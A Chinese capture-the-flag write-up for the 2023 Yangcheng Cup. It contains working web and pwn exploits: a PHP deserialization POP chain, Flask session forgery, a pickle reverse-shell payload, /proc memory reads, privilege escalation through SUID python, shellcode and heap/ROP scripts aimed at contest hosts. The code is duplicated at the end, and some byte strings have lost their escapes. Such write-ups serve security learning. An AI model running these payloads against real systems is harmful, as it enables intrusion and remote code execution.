# 2023年“羊城杯”网络安全大赛Writeup

> 原文: https://www.ctfiot.com/133282.html
> ID: 133282

Web

D0n’t pl4y g4m3!!!

跳转响应包提示hint.zip

发现php版本存在代码泄露

如下：

<?php
header("HTTP/1.1 302 found");
header("Location:
https://passer-by.com/pacman/");

class Pro{
    private $exp;
    private $rce2;

    public function __get($name)
    {
        return $this->$rce2=$this->exp[$rce2];
    }
    public  function __toString()
    {
            call_user_func('system', "cat /flag");
     }
}

class Yang
{
    public function __call($name, $ary)
    {
        if ($this->key === true || $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func($this->now[$name], $ary[0]);
            }
        }
    }
    public function ycb()
    {
        $this->now = 0;
        return $this->finish->finish;
    }
    public function __wakeup()
    {
        $this->key = True;
    }
}
class Cheng
{
    private $finish;
    public $name;
    public function __get($value)
    {

        return $this->$value = $this->name[$value];
    }
}
class Bei
{
    public function __destruct()
    {
        if ($this->CTF->ycb()) {
            $this->fine->YCB1($this->rce, $this->rce1);
        }
    }
    public function __wakeup()
    {
        $this->key = false;
    }
}

function prohib($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i";
    return preg_replace($filter,'',$a);
}

$a = $_POST["CTF"];
if (isset($a)){
  unserialize(prohib($a));
}
?>

构造pop链exp如下：

<?php
class Cheng{
    public $name;
    public function __construct()
    {
        $this->name = array("finish"=>"finish");
    }
}

class Yang{
    public $finish;
    public $now;
    public function __construct()
    {
        $this->finish = new Cheng();
        $this->now = array("YCB1"=>"syssystemtem");
    }

}

class Bei
{   
    public $CTF;
    public $fine;
    public $rce;
    public $rce1;
    public function __construct()
    {
        $this->CTF = new Yang();
        $this->fine = new Yang();
        $this->rce = "cat /tmp/catcatf1ag.txt";
        $this->rce1 = array("ls"=>"ls");
    }
}

$o = new Bei();
$ser = serialize($o);
$ser = str_replace("s:12","s:6",$ser);
echo urlencode($ser);

?>

O%3A3%3A%22Bei%22%3A4%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A1%3A%7Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A6%3A%22syssystemtem%22%3B%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A1%3A%7Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A6%3A%22syssystemtem%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A23%3A%22cat+%2Ftmp%2Fcatcatf1ag.txt%22%3Bs%3A4%3A%22rce1%22%3Ba%3A1%3A%7Bs%3A2%3A%22ls%22%3Bs%3A2%3A%22ls%22%3B%7D%7D

Serpent

访问/www.zip

获取app.py代码如下：

from flask import Flask, session
from secret import secret

@app.route('/verification')
def verification():
    try:
        attribute = session.get('Attribute')
        if not isinstance(attribute, dict):
            raise Exception
    
except Exception:
        return 'Hacker!!!'
    if attribute.get('name') == 'admin':
        if attribute.get('admin') == 1:
            return secret
        else:
            return "Don't play tricks on me"
    else:
        return "You are a perfect stranger to me"

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)

# 解密session就可以看到secret_key
python3 .flask_session_cookie_manager3.py encode  -s 'GWHT1GGAvNAKvF' -t '{"Attribute":{"admin":1,"name":"admin","secret_key":"GWHT1GGAvNAKvF"}}'
eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjEsIm5hbWUiOiJhZG1pbiIsInNlY3JldF9rZXkiOiJHV0hUMUdHQXZOQUt2RiJ9fQ.ZPK8mg.MEjHXayV-z1qvaSJZHGyAr2btl8

修改session，访问/verification，会提示你访问src0de

@app.route('/src0de')
def src0de():
    f = open(__file__, 'r')
    rsp = f.read()
    f.close()
    return rsp[rsp.index("@app.route('/src0de')"):]

@app.route('/ppppppppppick1e')
def ppppppppppick1e():
    try:
        username = "admin"
        rsp = make_response("Hello, %s " % username)
        rsp.headers['hint'] = "Source in /src0de"
        pick1e = request.cookies.get('pick1e')
        if pick1e is not None:
            pick1e = base64.b64decode(pick1e)
        else:
            return rsp
        if check(pick1e):
            pick1e = pickle.loads(pick1e)
            return "Go for it!!!"
        else:
            return "No Way!!!"
    
except Exception as e:
        error_message = str(e)
        return error_message

    return rsp

class GWHT():
    def __init__(self):
        pass

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)

import base64

opcode = b'''(cos
system
S'bash -i >& /dev/tcp/xxx.xxx.xx.xxx/Port 0>&1'
o.'''
print(base64.b64encode(opcode))

之后请求，cookie字段pick1e={base64_opcode}.即可反弹shell

之后就是提权了

www-data@out-0:/$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/python3.8
www-data@out-0:/$ python3.8 -c 'print(open("/flag")'
python3.8 -c 'print(open("/flag")'
  File "<string>", line 1
    print(open("/flag")
                      ^
SyntaxError: unexpected EOF while parsing
www-data@out-0:/$ python3.8 -c 'print(open("/flag").read())'
python3.8 -c 'print(open("/flag").read())'
DASCTF{96457914264959329419758606761175}

ArkNights

非预期了

/read?file=/proc/1/environ

预期解，应该是从内存中获取secret_key

import requests, re, time

url = "http://5000.endpoint-64c8f01c2b234d718b0e628fd789c642.m.ins.cloud.dasctf.com:81"
maps_url = f"{url}/read?file=/proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
print(maps)
for m in maps:
    start, end = m.split("-")[0], m.split("-")[1]
    Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))
    read_url = f"{url}/read?file=/proc/self/mem&start={Offset}&end={Length}"
    print(read_url)

    s = requests.get(read_url,timeout=6,stream=True)
    rt = re.findall("[a-z0-9]{8}*[a-z0-9]{4}*[a-z0-9]{4}*[a-z0-9]{4}*[a-z0-9]{12}", s.text)
    time.sleep(1)
    if rt:
        print(rt)
# 3c6f721f*34fe*4cc6*bc0f*7bd6884afbeb

之后生成session，构造代码执行

Pwn

shellcode

from pwn import *

context.log_level='debug'
p = process('./shellcode')
elf = ELF('./shellcode')

shellcode = '''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 0x2
    pop rax
    syscall
    mov rax,0x21
    mov rdi,0x3
    mov rsi,0x2
    syscall
    xor rax,rax
    mov rsi,rsp
    push 0x2
    pop rdi
    mov rdx,0x30
    syscall
    mov rax,0x21
    mov rdi,0x1
    mov rsi,0x5
    syscall
    mov rax,0x1
    mov rsi,rsp
    mov rdi,0x5
    syscall
'''    
code = asm(shellcode)

p.sendafter(b'[2] Input: (ye / no)',b'x0fx05')
p.sendafter(b'======',b'x53x58x5ex5ex5ex50x5fx5ax56x5cx5ax52x56x50x58x56xc3')

p.send(b'aa'+code)
p.interactive()
p.close()

cookieBox

我们这里直接定位漏洞函数：

存在UAF

思路

因为是musl libc，heap结构与其libc的结构不同，是双链表结构，也是从网上找到利用手法(从头开始 时间不够)，我们可以先泄露出来libc地址，然后控制释放chunk的fd和bk为mal+880和libc.sym[‘__stdin_FILE’]+0x40使我们可以申请到位于libc.sym[‘__stdin_FILE’]+0x40位置的heap，然后通过FSOP+gadget控制栈地址和程序执行流（getshell不知道为什么会卡住，应该是栈地址劫持到了__stdin_FILE位置的原因，所以直接orw）

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("tcp.cloud.dasctf.com",20730)
    elf = ELF(name)

def add(size,content,mode = True):
    p.sendlineafter(">>",'1')
    p.sendlineafter("Please input the size:",str(size))
    if mode == True:
        p.sendafter("Please input the Content:",content)
    else:
        # gdb.attach(p)
        sleep(2)
        p.send(content)
def edit(idx,content):
    p.sendlineafter(">>",'3')
    p.sendlineafter("Please input the idx:",str(idx))
    p.sendafter("Please input the content:",content)
def dele(idx):
    p.sendlineafter(">>",'2')
    p.sendlineafter("Please input the idx:",str(idx))
def show(idx):
    p.sendlineafter(">>",'4')
    p.sendlineafter("Please input the idx:",str(idx))

get_p("./pwn")
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)

dele(0)
add(0x30,"A"*0x8)
show(5)
mal = u64(p.recvuntil('x7f')[-6:].ljust(8,b'x00')) - 888
print(hex(mal))

libc = ELF('./libc.so')
libc.address = mal - 0x292ac0
print(hex(libc.address))

dele(3)
add(0x30,"A"*0x30)
dele(3)

edit(6,p64(mal+880)+p64(libc.sym['__stdin_FILE']+0x40))
add(0x30,'e'*0x30)

ret = libc.address+0x0000000000000cdc 
pop_rdi = libc.address+0x0000000000014862 
mov_rdx = libc.address+0x000000000004951a 
pop_rsi = libc.address+0x000000000001c237 
pop_rdx = libc.address+0x000000000001bea2 
binsh = next(libc.search(b"/bin/sh"))
system =libc.sym['system']
bss = 0x00602100
payload = b'A'*0x30+p64(libc.sym['__stdout_FILE']-0xb0)+p64(ret)*2 + p64(mov_rdx)

payloa = p64(pop_rdi) + p64(libc.sym['__stdout_FILE']-0x8) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0x0) + p64(libc.sym['open'])
payloa += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x30) + p64(elf.plt['read'])
payloa += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x30)+ p64(libc.sym['write'])

shell = p64(pop_rdi)+ p64(binsh) + p64(system)
add(0x100,payloa.ljust(0xa8,b"B")+b"./flagx00x00" +payload,mode=False)#3 

p.interactive()

easy_vm

思路：因为堆块有释放过，我们可以得到libc地址，我们再根据偏移即可对其赋值，使之任意地址写，改写exit_hook地址为one_gadget

难点：就是会有人远程libc和本地libc的偏移是差很多的，这个要注意，且ld偏移也要爆破

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name,env={"LD_PRELOAD":"./libc-2.23.so "})
    p = remote("tcp.cloud.dasctf.com",24723)
    elf = ELF(name)

def pwn():
    global exit_hook
    get_p("./pwn")
    offset = 0x3c4b10 + 0x10 + 88
    one_gadget = 0xf1147

    payload = p64(2) + p64(7) + p64(offset-one_gadget) + p64(1) + p64(6) + p64(exit_hook - one_gadget) + p64(3)
    # gdb.attach(p,"b *$rebase(0x0000000AB1)")
    # sleep(2)
    p.sendafter("Inputs your code:",payload)
# p.interactive()

for i in range(256):
    global exit_hook
    exit_hook = (0x5<<20) + (i <<12) + 0xf48
    try:
        pwn()
        p.interactive()
    
except:
        p.close()

Misc

ai和nia的交响曲

分析http流量，找到两个可疑文件，flag2.zip和flag1.png

先把这两个文件dump下来，发现flag2.zip是伪加密，解压得到flag2.txt

发现flag2.txt文件存在零宽隐写。

解密

对flag1.png进行分析，发现是lsb隐写

得到提示，找到一个视频IDBV1wW4y1R7Jv和半段flag:@i_n1a_l0v3S_

打开视频，根据flag2.txt的时间轴定位找后半段flag

先是找到@i_n1a_l0v3S_BANBANFAHEAM不对，往后找一位@i_n1a_l0v3S_CAOCAOGAIFAN。对了

EZ_misc

附件得到Grons.png，分离出一个zip解压后文件名为feld.txt

根据附件名字联想到Gronsfeld密码，找到Gronsfeld brust网站https://www.boxentriq.com/code-breaking/gronsfeld-cipher

使用自动爆破工具，得到提示。

google一会，找到相关资料https://www.bleepingcomputer.com/news/microsoft/windows-11-snipping-tool-privacy-bug-exposes-cropped-image-content/

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28303

github找复现工具https://github.com/frankthetank-music/Acropalypse-Multi-Tool/releases/tag/v1.0.0

最后恢复出截图，得到flag:
CvE_1s_V3Ry_intEr3sting!!

Matryoshka

从百度网盘下载得到flag.img，放到奇安信计算机取证系统，找到三个文件

有两个normal_rar.rar文件，两个文件大小不一样

从大的normal_rar.rar中分离出一个图片和一个普通的txt.txt，这里发现图片和not_real_cat.jpg显示的一样，但是内容大小不一样，有猫腻。

从小的normal_rar.rar看到提示watermark

使用blind_watermaker解盲水印，得到模糊字样Watermark_is_fun

https://github.com/guofei9987/blind_watermark/blob/master/README_cn.md

继续使用奇安信计算机取证系统，找到encrypt文件，猜测是加密的磁盘，用VeraCrypt挂载，这里有个坑，挂载密码是watermark_is_fun小写。

找到flag.txt

复制粘贴的时候发现也有零宽隐写。找到密钥Matryoshka，竟然就是标题

base32解得到

维吉尼亚得到flag


```
<?php
header("HTTP/1.1 302 found");
header("Location:
https://passer-by.com/pacman/");

class Pro{
    private $exp;
    private $rce2;

    public function __get($name)
    {
        return $this->$rce2=$this->exp[$rce2];
    }
    public  function __toString()
    {
            call_user_func('system', "cat /flag");
     }
}

class Yang
{
    public function __call($name, $ary)
    {
        if ($this->key === true || $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func($this->now[$name], $ary[0]);
            }
        }
    }
    public function ycb()
    {
        $this->now = 0;
        return $this->finish->finish;
    }
    public function __wakeup()
    {
        $this->key = True;
    }
}
class Cheng
{
    private $finish;
    public $name;
    public function __get($value)
    {

        return $this->$value = $this->name[$value];
    }
}
class Bei
{
    public function __destruct()
    {
        if ($this->CTF->ycb()) {
            $this->fine->YCB1($this->rce, $this->rce1);
        }
    }
    public function __wakeup()
    {
        $this->key = false;
    }
}

function prohib($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i";
    return preg_replace($filter,'',$a);
}

$a = $_POST["CTF"];
if (isset($a)){
  unserialize(prohib($a));
}
?>
<?php
class Cheng{
    public $name;
    public function __construct()
    {
        $this->name = array("finish"=>"finish");
    }
}

class Yang{
    public $finish;
    public $now;
    public function __construct()
    {
        $this->finish = new Cheng();
        $this->now = array("YCB1"=>"syssystemtem");
    }

}

class Bei
{   
    public $CTF;
    public $fine;
    public $rce;
    public $rce1;
    public function __construct()
    {
        $this->CTF = new Yang();
        $this->fine = new Yang();
        $this->rce = "cat /tmp/catcatf1ag.txt";
        $this->rce1 = array("ls"=>"ls");
    }
}

$o = new Bei();
$ser = serialize($o);
$ser = str_replace("s:12","s:6",$ser);
echo urlencode($ser);

?>
O%3A3%3A%22Bei%22%3A4%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A1%3A%7Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A6%3A%22syssystemtem%22%3B%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A1%3A%7Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A6%3A%22syssystemtem%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A23%3A%22cat+%2Ftmp%2Fcatcatf1ag.txt%22%3Bs%3A4%3A%22rce1%22%3Ba%3A1%3A%7Bs%3A2%3A%22ls%22%3Bs%3A2%3A%22ls%22%3B%7D%7D
from flask import Flask, session
from secret import secret

@app.route('/verification')
def verification():
    try:
        attribute = session.get('Attribute')
        if not isinstance(attribute, dict):
            raise Exception
    
except Exception:
        return 'Hacker!!!'
    if attribute.get('name') == 'admin':
        if attribute.get('admin') == 1:
            return secret
        else:
            return "Don't play tricks on me"
    else:
        return "You are a perfect stranger to me"

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
# 解密session就可以看到secret_key
python3 .flask_session_cookie_manager3.py encode  -s 'GWHT1GGAvNAKvF' -t '{"Attribute":{"admin":1,"name":"admin","secret_key":"GWHT1GGAvNAKvF"}}'
eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjEsIm5hbWUiOiJhZG1pbiIsInNlY3JldF9rZXkiOiJHV0hUMUdHQXZOQUt2RiJ9fQ.ZPK8mg.MEjHXayV-z1qvaSJZHGyAr2btl8
@app.route('/src0de')
def src0de():
    f = open(__file__, 'r')
    rsp = f.read()
    f.close()
    return rsp[rsp.index("@app.route('/src0de')"):]

@app.route('/ppppppppppick1e')
def ppppppppppick1e():
    try:
        username = "admin"
        rsp = make_response("Hello, %s " % username)
        rsp.headers['hint'] = "Source in /src0de"
        pick1e = request.cookies.get('pick1e')
        if pick1e is not None:
            pick1e = base64.b64decode(pick1e)
        else:
            return rsp
        if check(pick1e):
            pick1e = pickle.loads(pick1e)
            return "Go for it!!!"
        else:
            return "No Way!!!"
    
except Exception as e:
        error_message = str(e)
        return error_message

    return rsp

class GWHT():
    def __init__(self):
        pass

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
import base64

opcode = b'''(cos
system
S'bash -i >& /dev/tcp/xxx.xxx.xx.xxx/Port 0>&1'
o.'''
print(base64.b64encode(opcode))
www-data@out-0:/$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/python3.8
www-data@out-0:/$ python3.8 -c 'print(open("/flag")'
python3.8 -c 'print(open("/flag")'
  File "<string>", line 1
    print(open("/flag")
                      ^
SyntaxError: unexpected EOF while parsing
www-data@out-0:/$ python3.8 -c 'print(open("/flag").read())'
python3.8 -c 'print(open("/flag").read())'
DASCTF{96457914264959329419758606761175}
/read?file=/proc/1/environ
import requests, re, time

url = "http://5000.endpoint-64c8f01c2b234d718b0e628fd789c642.m.ins.cloud.dasctf.com:81"
maps_url = f"{url}/read?file=/proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
print(maps)
for m in maps:
    start, end = m.split("-")[0], m.split("-")[1]
    Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))
    read_url = f"{url}/read?file=/proc/self/mem&start={Offset}&end={Length}"
    print(read_url)

    s = requests.get(read_url,timeout=6,stream=True)
    rt = re.findall("[a-z0-9]{8}*[a-z0-9]{4}*[a-z0-9]{4}*[a-z0-9]{4}*[a-z0-9]{12}", s.text)
    time.sleep(1)
    if rt:
        print(rt)
# 3c6f721f*34fe*4cc6*bc0f*7bd6884afbeb
from pwn import *

context.log_level='debug'
p = process('./shellcode')
elf = ELF('./shellcode')

shellcode = '''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 0x2
    pop rax
    syscall
    mov rax,0x21
    mov rdi,0x3
    mov rsi,0x2
    syscall
    xor rax,rax
    mov rsi,rsp
    push 0x2
    pop rdi
    mov rdx,0x30
    syscall
    mov rax,0x21
    mov rdi,0x1
    mov rsi,0x5
    syscall
    mov rax,0x1
    mov rsi,rsp
    mov rdi,0x5
    syscall
'''    
code = asm(shellcode)

p.sendafter(b'[2] Input: (ye / no)',b'x0fx05')
p.sendafter(b'======',b'x53x58x5ex5ex5ex50x5fx5ax56x5cx5ax52x56x50x58x56xc3')

p.send(b'aa'+code)
p.interactive()
p.close()
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
    #libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("tcp.cloud.dasctf.com",20730)
    elf = ELF(name)

def add(size,content,mode = True):
    p.sendlineafter(">>",'1')
    p.sendlineafter("Please input the size:",str(size))
    if mode == True:
        p.sendafter("Please input the Content:",content)
    else:
        # gdb.attach(p)
        sleep(2)
        p.send(content)
def edit(idx,content):
    p.sendlineafter(">>",'3')
    p.sendlineafter("Please input the idx:",str(idx))
    p.sendafter("Please input the content:",content)
def dele(idx):
    p.sendlineafter(">>",'2')
    p.sendlineafter("Please input the idx:",str(idx))
def show(idx):
    p.sendlineafter(">>",'4')
    p.sendlineafter("Please input the idx:",str(idx))

get_p("./pwn")
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)
add(0x30,"A"*0x30)

dele(0)
add(0x30,"A"*0x8)
show(5)
mal = u64(p.recvuntil('x7f')[-6:].ljust(8,b'x00')) - 888
print(hex(mal))

libc = ELF('./libc.so')
libc.address = mal - 0x292ac0
print(hex(libc.address))

dele(3)
add(0x30,"A"*0x30)
dele(3)

edit(6,p64(mal+880)+p64(libc.sym['__stdin_FILE']+0x40))
add(0x30,'e'*0x30)

ret = libc.address+0x0000000000000cdc 
pop_rdi = libc.address+0x0000000000014862 
mov_rdx = libc.address+0x000000000004951a 
pop_rsi = libc.address+0x000000000001c237 
pop_rdx = libc.address+0x000000000001bea2 
binsh = next(libc.search(b"/bin/sh"))
system =libc.sym['system']
bss = 0x00602100
payload = b'A'*0x30+p64(libc.sym['__stdout_FILE']-0xb0)+p64(ret)*2 + p64(mov_rdx)

payloa = p64(pop_rdi) + p64(libc.sym['__stdout_FILE']-0x8) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0x0) + p64(libc.sym['open'])
payloa += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x30) + p64(elf.plt['read'])
payloa += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x30)+ p64(libc.sym['write'])

shell = p64(pop_rdi)+ p64(binsh) + p64(system)
add(0x100,payloa.ljust(0xa8,b"B")+b"./flagx00x00" +payload,mode=False)#3 

p.interactive()
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
    #libc = ELF("../libc/")
libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name,env={"LD_PRELOAD":"./libc-2.23.so "})
    p = remote("tcp.cloud.dasctf.com",24723)
    elf = ELF(name)

def pwn():
    global exit_hook
    get_p("./pwn")
    offset = 0x3c4b10 + 0x10 + 88
    one_gadget = 0xf1147

    payload = p64(2) + p64(7) + p64(offset-one_gadget) + p64(1) + p64(6) + p64(exit_hook - one_gadget) + p64(3)
    # gdb.attach(p,"b *$rebase(0x0000000AB1)")
    # sleep(2)
    p.sendafter("Inputs your code:",payload)
# p.interactive()

for i in range(256):
    global exit_hook
    exit_hook = (0x5<<20) + (i <<12) + 0xf48
    try:
        pwn()
        p.interactive()
    
except:
        p.close()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1693742855.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/2-1693742856.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/10-1693742856.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/9-1693742857.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1693742858.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/4-1693742858.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/4-1693742859.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/0-1693742859.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1693742860.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1693742860.png)